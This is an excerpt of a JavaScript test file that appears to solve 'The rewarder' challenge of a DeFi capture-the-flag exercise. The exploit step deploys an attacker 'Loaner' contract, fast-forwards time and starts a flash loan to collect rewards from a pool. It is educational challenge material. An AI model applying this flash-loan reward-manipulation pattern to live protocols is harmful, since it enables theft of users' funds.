...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        //deploy loaner contract
        const LoanerFactory = await ethers.getContractFactory('Loaner', attacker);
        this.loaner = await LoanerFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);
        // Advance time ~5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        // use flashloan to deposit DVT
        this.loaner.connect(attacker).startLoan();
